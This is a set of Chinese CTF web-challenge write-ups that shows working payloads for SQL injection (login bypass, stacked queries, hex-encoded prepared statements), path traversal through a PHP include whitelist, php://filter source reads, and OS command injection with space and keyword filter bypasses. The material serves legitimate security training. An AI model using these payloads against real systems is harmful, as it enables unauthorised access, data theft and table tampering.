# Web

## [极客大挑战 2019]EasySQL 1

网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697269227979-fd564186-7adb-4eaf-9e3e-8424fdd19fa4.png#averageHue=%230c0c0c&clientId=uf24ad900-2f88-4&from=paste&height=747&id=u1f8820fd&originHeight=934&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=569569&status=done&style=none&taskId=u5bf2ca64-b145-4ca8-9fea-76843b29330&title=&width=1530.4)<br />可以看到是一个登录窗口，题目已经说了是SQL注入<br />首先试一下弱口令，admin,123<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697269500707-e261da2b-33fa-446f-b907-e898575facae.png#averageHue=%23100909&clientId=uf24ad900-2f88-4&from=paste&height=747&id=u4b689535&originHeight=934&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=576337&status=done&style=none&taskId=ue42bb3eb-811a-4bb8-a5ad-0a9c898c1fb&title=&width=1519.2)<br />提示用户名密码错了<br />既然是第一道题，那应该是很简单了<br />判断是数字型还是字符型

1. 数字型

`and 1=1 回显正常`<br />`and 1=2 返回异常，存在数字型注入可能`

2. 字符型

`1 返回正常`<br />`1' 返回异常，存在字符型注入可能`<br />经过测试，发现username和password两个参数都可以分别注入和同时注入<br />构造payload<br />`url?usename=1'&password=1'`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270426620-acb3876c-9f0d-4dad-b7b5-b7e2f50b557f.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=750&id=uac410499&originHeight=938&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=578355&status=done&style=none&taskId=u9824586b-054d-4e84-998e-a4f99a53025&title=&width=1532.8)<br />回显报错，存在SQL字符型注入<br />**小试一下万能密码注入**<br />构造payload<br />`url?usename=1' or '1'='1&password=1' or '1'='1`<br />**回显flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270808644-23610741-6cba-4ccc-ac0d-20688612546d.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=746&id=u61a5ec44&originHeight=933&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588001&status=done&style=none&taskId=u34c8a5ee-5cfa-462d-8975-2dd088f61f5&title=&width=1524)<br />![](https://cdn.nlark.com/yuque/0/2023/jpeg/36016220/1697271707206-5d837e64-976e-44fc-b710-05a0ca10dd88.jpeg)

## [极客大挑战 2019]Havefun 1

网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697789393846-9148e474-ac05-4ced-8fb6-694a470ae325.png#averageHue=%23aae6da&clientId=udc76d59d-d910-4&from=paste&height=758&id=EPVgZ&originHeight=948&originWidth=1892&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24499&status=done&style=none&taskId=u09e967db-f466-4bd7-934a-31dcca38159&title=&width=1513.6)<br />title标题<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697789429253-bddc9ec0-be13-4fda-9d05-ca9e24024c6c.png#averageHue=%23fafaf9&clientId=udc76d59d-d910-4&from=paste&height=32&id=u658998dc&originHeight=40&originWidth=242&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2099&status=done&style=none&taskId=u55a9820b-ce79-4425-a498-8d81be75cdd&title=&width=193.6)<br />每一帧都不要放过，或许那个不起眼的地方就存在重要信息<br />到这并未发现什么重要信息，F12看看<br />在源代码底部发现PHP代码：
```php
<!--  
 $cat=$_GET['cat'];  
 echo $cat;  
 if($cat=='dog'){  
 	echo 'Syc{cat_cat_cat_cat}';  
 }  
 --> 
```
**PHP代码审计**
> 1. 通过GET方式进行传参（就是通过URL地址进行传参)，这个参数是cat
> 2. 输出参数cat的值
> 3. if判断语句，当cat=dog的时候即可输出flag

构造payload：<br />`url/?cat=dog`<br />**爆出flag：**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697790811744-a4a7a614-4cf3-4b63-8d0c-984a715f94c8.png#averageHue=%23aae6db&clientId=ua82db3db-7fc5-4&from=paste&height=744&id=uf8feeda1&originHeight=930&originWidth=1882&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28162&status=done&style=none&taskId=ueef1f1a6-ae40-4e85-84ea-c7cd9dcbb55&title=&width=1505.6)

## [HCTF 2018]WarmUp 1

题目环境：<br />![image](https://github.com/adm3n-hnt/CTF-Study/assets/79041980/ee5feecb-9dee-4754-bb41-ad6cc4c8d1a5)
<br />发现除了表情包，再无其他<br />F12试试<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697974053018-52fc716e-bc2c-45b6-9c17-2fd96014fb71.png#averageHue=%23fdfcfc&clientId=ub5185c9b-7e11-4&from=paste&height=214&id=u416571cf&originHeight=267&originWidth=673&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15663&status=done&style=none&taskId=u0bff4cc1-b75b-436b-bf23-32bb1aadcaf&title=&width=538.4)<br />发现source.php文件<br />访问这个文件，格式如下：<br />`url/source.php`<br />回显如下：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697974496348-8399c824-58b6-4335-8594-7e880b3324ef.png#averageHue=%23fefdfd&clientId=ub5185c9b-7e11-4&from=paste&height=760&id=u1a03ad0b&originHeight=950&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26282&status=done&style=none&taskId=u1cd2ad08-88b9-4eac-a6cc-4519f4012c6&title=&width=1534.4)<br />PHP代码审计：
```php
<?php
highlight_file(__FILE__);
class emmm
{
	public static function checkFile(&$page)
	{
    $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
    if (! isset($page) || !is_string($page)) {
    echo "you can't see it";
    return false;
    }
    
    if (in_array($page, $whitelist)) {
    return true;
    }
    
    $_page = mb_substr(
    $page,
    0,
    mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
    return true;
    }
    
    $_page = urldecode($page);
    $_page = mb_substr(
    $_page,
    0,
    mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
    return true;
    }
    echo "you can't see it";
    return false;
  }
}

if (! empty($_REQUEST['file'])
&& is_string($_REQUEST['file'])
&& emmm::checkFile($_REQUEST['file'])
) {
include $_REQUEST['file'];
exit;
} else {
echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}  
?>
```
> 1. 定义了一个名为emmm的类，该类有一个静态方法checkFile。checkFile方法接受一个字符串参数$page，这个参数可能代表一个文件名。
> 2. 定义了一个$whitelist数组，这个数组里面存在两个元素是"source.php"和"hint.php"。
> 3. checkFile方法首先检查$page是否存在且为字符串。如果不满足这些条件，它将输出"you can't see it"并返回false。
> 4. 然后，checkFile方法检查$page是否存在于一个名为$whitelist的数组中。这个数组包含两个元素，分别是"source.php"和"hint.php"。如果$page在$whitelist中，方法将返回true。
> 5. 如果$page不在$whitelist中，那么checkFile方法将尝试通过以下步骤查找匹配的文件名：
>    - 首先，它将$page和问号(?)连接起来，然后查找这个字符串在$page中的位置。这可能是为了检查是否存在一个查询字符串。
>    - 然后，它对$page进行url解码，再重复之前的步骤。
>    - 如果以上两种方式都未能找到匹配的文件名，那么方法将输出"you can't see it"并返回false。
> 6. 在类的定义之外，这段代码检查了一个名为$_REQUEST['file']的变量。如果这个变量非空且为字符串，并且通过emmm::checkFile($_REQUEST['file'])检查，那么它将包含(include)这个文件并退出。否则，它将显示最初页面的那个滑稽表情包图片。
> 7. 总的来说，给了我们一个参数是file，我们给file参数传值就等于是给page参数传值，传的值需要提前用英文问号（?）连接起来，然后我们就可以找flag，怎么找flag是个问题，但是在代码里面还有一个名为hint.php的文件，不妨去看看，或许有咱们需要的信息。

查看hint.php内容<br />查看格式:<br />`url/hint.php`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697975963284-97546441-9786-46ad-9d1f-2599a6599f95.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=746&id=u305af69c&originHeight=933&originWidth=1890&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20963&status=done&style=none&taskId=uf4205885-caab-469e-8a98-72d48dae815&title=&width=1512)<br />这里说flag在**ffffllllaaaagggg**文件里面<br />有了目标就好办了，构造下payload：<br />`url/source.php?file=hint.php?/ffffllllaaaagggg`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697976368038-08caff31-561b-487f-b2cc-bc5a8fea83ea.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=746&id=ue12ed593&originHeight=933&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23883&status=done&style=none&taskId=u72bc8df1-d739-4fd3-9271-f02340f417d&title=&width=1517.6)<br />竟然什么都没有显示<br />**分析一下原因：**
> 1. 首先我们的payload要在source.php文件下进行，因为参数在这里面。
> 2. flag在ffffllllaaaagggg里面，ffffllllaaaagggg又在hint.php里面，并且$whitelist数组里面也存在hint.php文件，所以说要先进到hint.php文件里面。
> 3. 英文问号(?)连接后面的字符串也没有问题
> 4. 到这里payload构造是没有问题的，那么问题就出在了找flag的位置不对！
> 5. 我们这个payload是在hint.php文件里面找的，但是没有，返回上一级找找看？问题是也不知道flag具体在哪一级，那就构造多一些，溢出的部分没关系，这里只会显示最后一个目录。
> 6. 了解一下：
> 
1、“.”表示当前目录，也可以用“./”表示。
> 2、“..”表示上一级目录，也可以用“../”表示。
> 3、“~” 代表用户自己的宿主目录。
> 4、“/”处于Linux文件系统树形结构的最顶端，我们称它为Linux文件系统的root，它是Linux文件系统的入口。

**继续构造payload：**<br />`url/source.php?file=hint.php?../../../../../../ffffllllaaaagggg`<br />这里就是说一直返回上一级查找，直到查找到flag为止，最终返回到/root根目录，因为ffffllllaaaagggg原本是在hint.php文件里面嘛，所以说要一直往上一级目录找它的原始位置，<br />../倒不是一定是6个，看你的flag具体在那个上一级目录了😉<br />上传payload<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697977284649-5b659143-d504-4ace-b1c1-f09a3d4919c5.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=740&id=u3c6d46da&originHeight=925&originWidth=1526&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30633&status=done&style=none&taskId=u126f933d-d65c-40bf-9faa-b9de17c4e02&title=&width=1220.8)<br />**爆出flag：**<br />`flag{89c3539b-c6f4-4454-892a-ff1e460a560b}`

## [ACTF2020 新生赛]Include 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134020267-86822c9a-ec92-4a1e-b22c-b2112efdb3ee.png#averageHue=%23ffffff&clientId=u8db967fb-52e9-4&from=paste&height=86&id=u9d2cf06e&originHeight=108&originWidth=292&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=994&status=done&style=none&taskId=u2a26d94d-5aef-4f9d-a33e-dc397f538b3&title=&width=233.6)<br />超链接，点进去看看<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134074547-c749cc10-31be-4dc9-910d-cc155dd86a47.png#averageHue=%23f9f7f6&clientId=u8db967fb-52e9-4&from=paste&height=60&id=u6e2598e7&originHeight=75&originWidth=359&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2304&status=done&style=none&taskId=ud2595288-51b7-40d9-880f-fbef789bbe0&title=&width=287.2)<br />你能找到flag吗？<br />除了这些网页什么都没有，但是不当紧，因为我们有一双善于发现的眼睛👀<br />F12瞅瞅<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134230106-8aba5c20-f581-430e-8dfd-3853258a4dec.png#averageHue=%23f7f7f6&clientId=u8db967fb-52e9-4&from=paste&height=60&id=u522e286c&originHeight=75&originWidth=306&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1590&status=done&style=none&taskId=uad68142b-4b70-43fa-ba46-c2420a36283&title=&width=244.8)<br />无，并无其他<br />等等URL看了吗？<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134295681-4af81dcd-991d-4f0b-9271-c44f9d8c6425.png#averageHue=%23e9e6e4&clientId=u8db967fb-52e9-4&from=paste&height=34&id=ub3d3abb5&originHeight=42&originWidth=705&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4706&status=done&style=none&taskId=u36343248-7e57-492a-82f6-b3a9e195070&title=&width=564)<br />发现存在一个参数file，并且已经给出flag.php文件了<br />主题题目名称Include，意为文件包含，大部分文件包含都要用到PHP伪协议<br />通过PHP伪协议构造payload：<br />`URL/?file=php:filter/read=convert.base64-encode/resource=flag.php`
> 通过PHP伪协议读取flag.php文件，并通过base64编码格式显示出来
> 想要了解更多PHP伪协议可以看我这篇同类题目，希望对大家的学习有所帮助

[fileclude-CTF 解题思路-CSDN博客](https://blog.csdn.net/m0_73734159/article/details/130383801?spm=1001.2014.3001.5501)<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134847514-d4ae6b5a-bcc4-4742-b695-08f4289fc16a.png#averageHue=%23ece7e3&clientId=u8db967fb-52e9-4&from=paste&height=30&id=u3581d467&originHeight=38&originWidth=1524&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8955&status=done&style=none&taskId=u1d3e4945-1e59-47c4-ae90-de9ac52c5be&title=&width=1219.2)<br />`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NDAwZjJiYzYtOGI2Mi00NWEyLTg1ZDQtMmVkYzU0MjY4MTU0fQo=`<br />base64解码一把梭<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134962350-0b61c7c4-3050-49aa-9554-ff84826c299d.png#averageHue=%23fcfafa&clientId=u8db967fb-52e9-4&from=paste&height=366&id=u4516bb27&originHeight=457&originWidth=1857&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41230&status=done&style=none&taskId=u58662f99-af00-43ce-825d-3d16d3df8fe&title=&width=1485.6)<br />**得出flag：**<br />`**flag{400f2bc6-8b62-45a2-85d4-2edc54268154}**`

## [ACTF2020 新生赛]Exec 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200273276-d8bf8b0f-d18f-4412-bd93-8298fe43b65d.png#averageHue=%23fafafa&clientId=u90f92586-9a2e-4&from=paste&height=217&id=u1ff865d8&originHeight=271&originWidth=422&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7249&status=done&style=none&taskId=uef777c1e-df70-4229-bccf-479692edf47&title=&width=337.6)<br />是一个ping操作，ping个127.0.0.1试试<br />有回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200374948-9b9106de-3cb0-456c-bcaf-7b2264745f7e.png#averageHue=%23f7f6f6&clientId=u90f92586-9a2e-4&from=paste&height=362&id=u4c09c0b6&originHeight=453&originWidth=737&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29419&status=done&style=none&taskId=uc6f6b8d9-8e81-4db6-b0a6-ce484f5868b&title=&width=589.6)<br />**看起来有点像PWN的题，猜测通过列出目录文件，是否存在flag文件，并查看文件内容，并且存在两种方法解题，一种是管道符，一种是堆叠查询**
<a name="kJ9SD"></a>
### **第一种、管道符**
列出目录文件<br />`127.0.0.1 | ls`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200626535-7603173b-89cb-467f-8a80-dd326dc6b9ec.png#averageHue=%23fbfafa&clientId=u90f92586-9a2e-4&from=paste&height=238&id=udc3c072c&originHeight=298&originWidth=608&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14860&status=done&style=none&taskId=ua96231c2-f06f-4b22-bcfc-c615a685d0b&title=&width=486.4)<br />列出隐藏文件<br />`127.0.0.1 | ls -a`<br />发现存在上级目录<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200737957-c7c1e57b-81ab-4f32-9b73-1132755e7e9f.png#averageHue=%23f9f9f9&clientId=u90f92586-9a2e-4&from=paste&height=272&id=u7222c59c&originHeight=340&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13679&status=done&style=none&taskId=u5eb2e479-1d42-4f90-9d87-1e77f1909cc&title=&width=407.2)<br />因此可以看出，此处命令执行并不是在root/根目录下进行的\<br />列出/根目录下的目录文件<br />`127.0.0.1 | ls /`![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200911159-c35404fc-a613-4749-a295-af252df9ab3f.png#averageHue=%23f7f7f6&clientId=u90f92586-9a2e-4&from=paste&height=542&id=u541df299&originHeight=677&originWidth=758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22769&status=done&style=none&taskId=u119b73cc-c464-4645-8912-76002e2bfb9&title=&width=606.4)<br />存在flag，查看根目录下flag文件的内容<br />`127.0.0.1 | cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201091955-da441925-18eb-4b20-a3bc-3d787212779f.png#averageHue=%23fafaf9&clientId=u90f92586-9a2e-4&from=paste&height=235&id=u18dbeba0&originHeight=294&originWidth=551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13795&status=done&style=none&taskId=uc0310f77-164d-4d25-9277-7434ed2f55b&title=&width=440.8)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`

<a name="OH7u8"></a>
### **第二种、堆叠查询**
列出当前目录文件；列出隐藏文件；列出根目录下的文件；查看根目录下flag文件的内容<br />`127.0.0.1;ls;ls -a;ls /;cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201726844-14a619f6-1821-472c-ac35-9a2ee3f40d45.png#averageHue=%23f5f5f5&clientId=u90f92586-9a2e-4&from=paste&height=758&id=ufa57bd66&originHeight=948&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66837&status=done&style=none&taskId=u995fe147-fc69-4add-b6b4-fa09bff2b73&title=&width=850.4)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`<br />两种方法可以看出有明显的不同

## [GXYCTF2019]Ping Ping Ping 1

题目环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698213860659-24b1340b-4b31-4179-858c-eb21e6fe7ca6.png#averageHue=%23fdfdfd&clientId=ub5d3c2c2-2e29-4&from=paste&height=80&id=u3cb957d5&originHeight=100&originWidth=194&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=942&status=done&style=none&taskId=u709bb2d6-dff9-4f14-9762-6572d3ef5d6&title=&width=155.2)
> 给了一个ip参数
> 注意题目Ping Ping Ping
> 意思就是让我们进行Ping地址
> 随便输入一个地址Ping一下

`URL?ip=0`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698214503187-24afc92e-d4f5-44d8-9357-7ee5cc42073e.png#averageHue=%23f2f2f2&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=u2f328aee&originHeight=243&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6638&status=done&style=none&taskId=u2b46f94e-eb00-44b7-8783-39f777d4836&title=&width=407.2)
> 有回显结果，和上题类似
> [[ACTF2020 新生赛]Exec 1-CSDN博客](https://blog.csdn.net/m0_73734159/article/details/134029479?spm=1001.2014.3001.5501)

查看当前目录文件<br />`URL?ip=0;ls`（这里使用堆叠注入查询）<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698215336545-0196e2f9-1197-4aec-9d73-1d7e2291aa10.png#averageHue=%23f3f3f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=208&id=u8bb77e42&originHeight=260&originWidth=514&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11528&status=done&style=none&taskId=u7270158f-a2c2-489e-9e04-e52847199ac&title=&width=411.2)<br />直接给出了咱们flag文件，事实上真的有这么简单吗？<br />查看flag文件看看是什么情况<br />`URL?ip=0;cat flag.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698215574532-4eb59f0a-d7cc-4a5b-96f3-92ca289c26b1.png#averageHue=%23f4f1f0&clientId=ub5d3c2c2-2e29-4&from=paste&height=33&id=u90d497d1&originHeight=41&originWidth=286&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1795&status=done&style=none&taskId=u4cc81793-fcc6-408e-990d-ff9c9573b39&title=&width=228.8)<br />空格报错！<br />查看flag关键字是否被过滤<br />`URL?ip=0;flag.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698216109157-fca1c30b-1dc9-40e2-9fde-9362e959bce4.png#averageHue=%23f6f4f2&clientId=ub5d3c2c2-2e29-4&from=paste&height=50&id=ub5b17a0d&originHeight=62&originWidth=223&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1798&status=done&style=none&taskId=ue0d0ebcc-17bb-424b-9b52-b49ae68ee50&title=&width=178.4)<br />flag报错！<br />查看字符是否被过滤<br />`URL?ip=0;/`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698216192362-6f85930f-085f-4100-aa36-0f36e2f4d802.png#averageHue=%23f5f3f1&clientId=ub5d3c2c2-2e29-4&from=paste&height=42&id=u65550639&originHeight=53&originWidth=276&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2005&status=done&style=none&taskId=u4032e5b2-9131-4d9f-b41b-270633e2eee&title=&width=220.8)<br />字符报错！<br />好啊好啊，过滤这么多东西，不过好在/符号不用绕过了，因为flag就在当前目录<br />**空格绕过**
> 1. cat${IFS}flag.txt 
> 2. cat$IFS$9flag.txt （正整数可以是任意）
> 3. cat<flag.txt 
> 4. cat<>flag.txt
> 5.  {cat,flag.txt}

**flag关键字绕过**
> 可以使用定义变量绕过
> $x=ag
> fa$x=flag

**构造payload：**<br />`**URL?ip=0;x=ag;cat${IFS}fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219076973-3a184aa5-455d-4a45-a589-0efebf7fb4a3.png#averageHue=%23f7f5f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=38&id=u7ebe6899&originHeight=48&originWidth=350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2073&status=done&style=none&taskId=u83d5b49d-311e-45fb-bc3b-237b51d3596&title=&width=280)<br />字符报错！<br />猜测"{}"被过滤<br />试试第二种空格绕过方法<br />**构造payload:**<br />`**URL?ip=0;x=ag;cat$IFS$1fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219718651-776f6cfd-2a1b-4bf7-a8bd-8bec0412f405.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=ube092bab&originHeight=242&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6709&status=done&style=none&taskId=u9d310f28-ddb7-4529-ab14-a89be2deda3&title=&width=457.6)<br />**有回显结果，绕过成功，但是没有发现flag，F12查看网页源代码，看看有没有flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219743590-733bf4b1-15e3-4bad-8374-3d6e45d77975.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=216&id=u3ab197a6&originHeight=270&originWidth=581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12592&status=done&style=none&taskId=u9dcd84a9-a474-4ab9-ad31-1246b948b85&title=&width=464.8)<br />**得出flag：**<br />`flag{08512195-033d-4f18-a5b0-00dcbc58c4b8}`

## [强网杯 2019]随便注 1(超详细，三种解法）

<a name="evxPg"></a>
### **第一种解法 堆叠注入**
网页环境<br />![image.png](https://img-blog.csdnimg.cn/img_convert/434cfacea88d014f556ac56fdbb36d36.png)<br />判断是否是字符型注入<br />`1'`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2e8bc28f595dbd11974934fa20cfa369.png)<br />判断是否存在关键字过滤<br />`select`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2c4f19b88e0523022badbf2d4d7d92ec.png)<br />联合查询被过滤，只能用堆叠注入了<br />查看有几个字段<br />`1' order by 2#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/e3ca73027a6fe25e7ae0afa4bda848c9.png)<br />正常回显<br />`1' order by 3#`![image.png](https://img-blog.csdnimg.cn/img_convert/895055b725e189d42fe79ffc45702f31.png)<br />回显报错，可以看出只有两个字段<br />查看所有数据库<br />`1'; show databases;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/823d4fa00155a99b585dde3cf3cef82e.png)<br />查看所有数据表<br />`1'; show tables;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/b56eead234c1e36df2c5049451dec8a1.png)<br />爆words数据表的字段<br />`1';show columns from words;#`![image.png](https://img-blog.csdnimg.cn/img_convert/72352caabc7e406ed88ce07fb607b3c5.png)<br />爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）<br />`1';show columns from `1919810931114514`;#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/014d47d3f850c8e809957090e00fb188.png)<br />可以看到这两个表words表有两个字段，而另一个只有一个字段<br />后台SQL查询语句应该是：<br />`select * from words where id=`<br />所以说只能先查询id字段，然而另一个表只有一个flag字段是肯定爆不了flag的，并且类型为varchar字符串类型，而恰巧words数据表里面的data也是varchar类型，因此从这里就可以得到做题思路，通过rename函数进行改表，把`1919810931114514`改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。<br />构造payload：<br />`1';rename table words to BaiMao;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key;alter table words change flag data varchar(100);#`
> rename修改表名
> alter修改已知的列
> add增加
> int整数类型
> unsigned无符号类型
> **not null**- 指示某列不能存储 NULL 值。
> **primary key** - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。
> **auto_increment**-自动赋值，默认从1开始。

成功回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/8122d53a32c6179d396ce793725a8a9c.png)<br />注意没有回显flag，就类似于你更新了个东西但是没刷新，重新在文本框里面输入1提交即可回显flag。
<a name="z4q8F"></a>
### 第二种解法 编码逃逸 绕过滤
由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514``（注意这里使用反引号把这个数字包括住，md编辑器打不上去） <br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c6563742a66726f6d7768657265603139313938313039333131313435313460`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
> - prepare…from…是预处理语句，会进行编码转换。
> - execute用来执行由SQLPrepare创建的SQL语句。
> - SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
> - 0x就是把后面的编码格式转换成16进制编码格式
> - 那么总体理解就是，使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare...from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。
参考：https://blog.csdn.net/qq_44657899/article/details/10323914

回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/d9511654ed16ddd5152c6598b5fecbde.png)
<a name="E2zV0"></a>
### 第三种解法 handler代替select
select命令被过滤了怎么办？我们还可以用handler命令进行查看，handler命令可以一行一行的显示数据表中的内容。<br />构造payload：<br />`1'; handler `1919810931114514` open as `a`; handler `a` read next;#`
> handler代替select，以一行一行显示内容
> open打开表
> as更改表的别名为a
> read next读取数据文件内的数据次数

上传payload，回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/1aa5220a282ceac998065c80dc38af21.png)



